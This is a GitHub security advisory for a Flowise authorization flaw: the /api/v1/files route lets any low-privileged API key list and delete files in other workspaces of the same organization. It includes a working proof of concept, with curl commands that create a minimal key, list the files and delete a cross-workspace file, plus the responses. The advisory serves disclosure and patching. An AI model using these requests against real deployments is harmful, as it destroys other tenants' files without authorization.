# [H] Flowise: Missing authorization on `/api/v1/files` allows low-privileged API keys to list and delete files across workspaces within the same organization

## Summary
Severity: High
Advisory: GHSA-wp74-f5hh-5f3r
CVE: CVE-2026-69252
CWE: CWE-862
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-wp74-f5hh-5f3r
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3

## Details
# summary:
In Flowise, the `/api/v1/files` route is protected only by the `feat:files` feature gate and does not enforce `checkPermission(...)` on either `GET` or `DELETE`. As a result, any authenticated API key within the organization, even one with unrelated permissions, can list and delete files belonging to other workspaces in the same organization.

# details:
The `/files` route is mounted with `IdentityManager.checkFeatureByPlan('feat:files')` only and has no additional permission middleware. In the controller:

- `getAllFiles` uses only `req.user.activeOrganizationId` and calls `getFilesListFromStorage(activeOrganizationId)`, which recursively lists files under the organization storage root
- `deleteFile` reads `activeWorkspaceId`, but only uses it for storage quota bookkeeping; the actual deletion is performed using `activeOrganizationId + user-controlled path`

As a result, the API key’s `permissions` and `activeWorkspaceId` are not used to restrict file access.  
In the local test environment,an API key bound to workspace `1592b32a-a11b-4996-80b6-e1c4c2969d88` with only `["tools:view"]` was created, then successfully:

- called `GET /api/v1/files` and received `200 OK`
- listed a test file stored under a different workspace, `f92a9a4d-392e-4db2-af82-d14e1d553446`
- called `DELETE /api/v1/files?path=f92a9a4d-392e-4db2-af82-d14e1d553446/poc-cross-workspace.txt` and received `200 OK`
- confirmed the file was removed by re-querying the file list

# impact:
Any low-privileged API key holder within the same organization can list and delete files from other workspaces without any file-specific permission. This breaks workspace isolation inside the organization and can lead to unauthorized file access and destructive tampering.

# reproduction steps:

1. Log in as a user who can create API keys, and create a key with only an unrelated permission, for example:

```bash
curl -i -b tamako.cookie \
  -H 'x-request-from: internal' \
  -H 'Content-Type: application/json' \
  -d '{"keyName":"poc-files-noperm","permissions":["tools:view"]}' \
  http://localhost:8080/api/v1/apikey
```

2. Record the returned API key. In my local test, the key was:

- `ykT6h4Q-u2PZDJmy2kMLWWKL_N42u8mHfYSvHC5Ja0E`

3. Prepare a test file under a different workspace within the same organization, for example:

- `f92a9a4d-392e-4db2-af82-d14e1d553446/poc-cross-workspace.txt`

4. Use the low-privileged API key to list files:

```bash
curl -i \
  -H 'Authorization: Bearer ykT6h4Q-u2PZDJmy2kMLWWKL_N42u8mHfYSvHC5Ja0E' \
  http://localhost:8080/api/v1/files
```

5. Observe a `200 OK` response that includes a file from another workspace, for example:

```json
[{"name":"poc-cross-workspace.txt","path":"f92a9a4d-392e-4db2-af82-d14e1d553446/poc-cross-workspace.txt","size":19}]
```

6. Use the same API key to delete that file:

```bash
curl -i -X DELETE --get \
  -H 'Authorization: Bearer ykT6h4Q-u2PZDJmy2kMLWWKL_N42u8mHfYSvHC5Ja0E' \
  --data-urlencode 'path=f92a9a4d-392e-4db2-af82-d14e1d553446/poc-cross-workspace.txt' \
  http://localhost:8080/api/v1/files
```

7. Observe a `200 OK` response:

```json
{"message":"file_deleted"}
```

8. Call `GET /api/v1/files` again and confirm that the file is no longer present.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wp74-f5hh-5f3r
- https://github.com/FlowiseAI/Flowise/pull/6435
- https://github.com/FlowiseAI/Flowise/commit/bc22bf8baec95b6a3d6e1b3563b4f03491cd6fbb
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
